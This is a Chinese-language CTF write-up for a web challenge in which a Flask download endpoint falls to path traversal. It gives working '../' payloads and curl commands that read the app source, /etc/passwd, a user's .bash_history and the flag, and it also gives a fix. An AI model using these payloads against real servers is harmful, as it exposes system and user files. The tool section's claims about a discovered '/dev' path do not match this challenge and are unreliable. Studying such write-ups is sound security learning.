# NovruzCTF 2026 - python-server Writeup

## 题目信息

- **比赛**: NovruzCTF 2026
- **题目**: python-server
- **类别**: Web
- **难度**: 简单
- **附件/URL**: `https://58538afc0c.chall.canyouhack.org`
- **TCP**: `nc 58538afc0c.chall.canyouhack.org 10009`
- **题目描述**: 我们搭建了一个简单的Python文件服务器。它只提供files目录中的文件，所以完全安全。
- **状态**: 已解

## Flag

```text
novruzCTF{2068f5f319da6594145738a9b4516515}
```

## 解题过程

### 1. 初始侦察

访问主页，发现是一个简单的文件下载服务器，只提供了一个示例文件：

```text
https://58538afc0c.chall.canyouhack.org/download?file=sample.txt
```

返回内容：`This is a sample text file available for download!`

URL 参数 `file=sample.txt` 直接传入文件名 — 典型的路径遍历攻击面。

### 2. 读取服务器源码

使用 `../` 跳出 `files` 目录读取 Flask 应用源码：

```text
/download?file=../app.py
```

成功获取源码：

```python
from flask import Flask, request, render_template, send_file
import os

app = Flask(__name__)
FILES_DIR = os.path.join(app.root_path, '../files')


@app.route('/download')
def download():
   filename = request.args.get('file')
   if not filename:
      return "Please specify a file to download.", 400

   # VULNERABILITY: No path traversal protections
   filepath = os.path.join(FILES_DIR, filename)

   try:
      if os.path.exists(filepath):
         return send_file(filepath)
      else:
         return "File not found.", 404
   except Exception as e:
      return str(e), 500
```

**漏洞确认**：`filename` 直接拼接到路径中，无任何过滤或校验。

### 3. 系统用户枚举

读取 `/etc/passwd`：

```text
/download?file=../../../../../etc/passwd
```

发现关键用户：

```text
ctf:x:1000:1000::/home/ctf:/bin/sh
system_admin:x:1001:1001::/home/system_admin:/bin/sh
```

### 4. 历史命令泄露

常见 flag 位置（`/flag.txt`、`/home/ctf/flag.txt` 等）均未找到。

转而读取 `system_admin` 的 bash 历史记录：

```text
/download?file=../../../../../home/system_admin/.bash_history
```

返回：

```text
cat /home/system_admin/secret_flag.txt
```

### 5. 获取 Flag

根据历史记录的提示，直接读取：

```text
/download?file=../../../../../home/system_admin/secret_flag.txt
```

```text
novruzCTF{2068f5f319da6594145738a9b4516515}
```

## 攻击链总结

```text
源码泄露 → 漏洞确认 → /etc/passwd 用户枚举 → .bash_history 信息泄露 → 读取 Flag
```

## 漏洞分析

### 根因

`os.path.join(FILES_DIR, filename)` 在 `filename` 包含 `../` 时会跳出预期目录，而代码未做任何防护：

- 未过滤 `../` 序列
- 未用 `os.path.realpath()` 校验最终路径是否仍在允许目录内

### 修复方案

```python
filepath = os.path.realpath(os.path.join(FILES_DIR, filename))
if not filepath.startswith(os.path.realpath(FILES_DIR)):
    return "Access denied.", 403
```

## 知识点

- **Path Traversal（路径遍历）** — OWASP Top 10 常见漏洞，通过 `../` 跳出预期目录
- **信息收集链** — `/etc/passwd` 枚举用户 → `.bash_history` 发现敏感文件路径
- **Flask send_file** — 直接发送服务器任意文件，未做沙箱隔离

## 使用的工具

- `curl` — HTTP 请求

## 脚本归档
- Go：[`NovruzCTF_python-serverl.go` :material-open-in-new:](https://github.com/starnotes-xj/BIGC_CTF_Writeups/blob/main/CTF_Writeups/scripts_go/NovruzCTF_python-serverl.go){target="_blank"}
- Python：[`NovruzCTF_python-serverl.py` :material-open-in-new:](https://github.com/starnotes-xj/BIGC_CTF_Writeups/blob/main/CTF_Writeups/scripts_python/NovruzCTF_python-serverl.py){target="_blank"}

## 命令行提取关键数据（无 GUI）

```bash
# 读取源码确认漏洞
curl -s "https://58538afc0c.chall.canyouhack.org/download?file=../app.py"

# 读取 /etc/passwd 枚举用户
curl -s "https://58538afc0c.chall.canyouhack.org/download?file=../../../../../etc/passwd"

# 读取 .bash_history 获取 flag 位置
curl -s "https://58538afc0c.chall.canyouhack.org/download?file=../../../../../home/system_admin/.bash_history"

# 读取 flag
curl -s "https://58538afc0c.chall.canyouhack.org/download?file=../../../../../home/system_admin/secret_flag.txt"
```

## 推荐工具与优化解题流程

> 参考 `CTF_TOOLS_EXTENSION_PLAN.md` 中的 Web 工具推荐。

### 1. ffuf — 目录爆破与路径发现（推荐首选）

[ffuf](https://github.com/ffuf/ffuf) 是 Go 编写的高速 Web fuzzer，可快速发现隐藏路径和文件。

**安装：**
```bash
go install github.com/ffuf/ffuf/v2@latest
```

**详细操作步骤：**

**Step 1：目录爆破发现 /dev 路径**
```bash
# 使用常见目录字典爆破
ffuf -u https://58538afc0c.chall.canyouhack.org/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -mc 200,301,302,403

# 输出会发现: /dev [Status: 200]
```

**Step 2：爆破 /dev 下的文件**
```bash
# 发现隐藏文件名（如 hash 名文件）
ffuf -u https://58538afc0c.chall.canyouhack.org/FUZZ \
  -w /usr/share/wordlists/dirb/big.txt \
  -mc 200 -fs 0
```

**Step 3：路径遍历 Fuzz**
```bash
# 自动化测试路径遍历深度
ffuf -u "https://58538afc0c.chall.canyouhack.org/download?file=FUZZ" \
  -w /usr/share/wordlists/LFI/LFI-Jhaddix.txt \
  -mc 200 -fs 50
# 字典包含 ../../../etc/passwd 等常见 LFI payload
```

**优势**：自动化发现隐藏路径，比手动猜测快得多；Go 编写，性能极高。

---

### 2. Burp Suite — 全流程 Web 测试

[Burp Suite Community](https://portswigger.net/burp/communitydownload) 是 Web 安全测试的瑞士军刀。

**详细操作步骤：**

**Step 1：配置代理**
1. 启动 Burp Suite → Proxy → 设置浏览器代理为 `127.0.0.1:8080`
2. 浏览器访问目标网站，所有请求会被 Burp 捕获

**Step 2：Repeater 手动测试路径遍历**
1. 在 HTTP History 中找到 `/download?file=sample.txt` 请求
2. 右键 → Send to Repeater
3. 修改 `file` 参数，逐步增加 `../` 深度：
   - `../app.py` → 获取源码
   - `../../../../../etc/passwd` → 读取系统文件
4. 每次修改后点击 Send，观察响应

**Step 3：Intruder 自动化枚举用户文件**
1. 将请求发送到 Intruder
2. 标记 `file=§../../../../../home/FUZZ/.bash_history§` 为 payload 位置
3. 加载用户名列表（从 /etc/passwd 提取）
4. 启动攻击，根据响应长度筛选有效结果

**优势**：可视化操作，Repeater 方便快速迭代测试；Intruder 自动化枚举。

---

### 3. nuclei — 模板化漏洞扫描

[nuclei](https://github.com/projectdiscovery/nuclei) 是 Go 编写的模板化漏洞扫描器，内置 LFI/路径遍历检测模板。

**安装：**
```bash
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
nuclei -update-templates
```

**详细操作步骤：**

**Step 1：运行 LFI 专项扫描**
```bash
nuclei -u https://58538afc0c.chall.canyouhack.org \
  -tags lfi,path-traversal \
  -severity low,medium,high,critical
```

**Step 2：针对 download 端点扫描**
```bash
nuclei -u "https://58538afc0c.chall.canyouhack.org/download?file=sample.txt" \
  -tags lfi
# nuclei 会自动替换参数值为各种 LFI payload 进行测试
```

**优势**：一条命令自动检测路径遍历漏洞，模板库持续更新。

---

### 工具对比总结

| 工具 | 适用阶段 | 本题耗时 | 优点 |
|------|---------|---------|------|
| **ffuf** | 路径发现、Fuzz | ~2 分钟 | 高速目录爆破，自动发现 /dev |
| **Burp Suite** | 手动测试、迭代 | ~5 分钟 | 可视化，Repeater 方便调试 |
| **nuclei** | 自动检测 | ~1 分钟 | 一键扫描，内置 LFI 模板 |
| **curl** | 手动请求 | ~10 分钟 | 轻量无依赖，但效率低 |

**推荐流程**：ffuf 目录爆破 → Burp Repeater 确认路径遍历 → 手动提取敏感文件 → 5 分钟内完成。
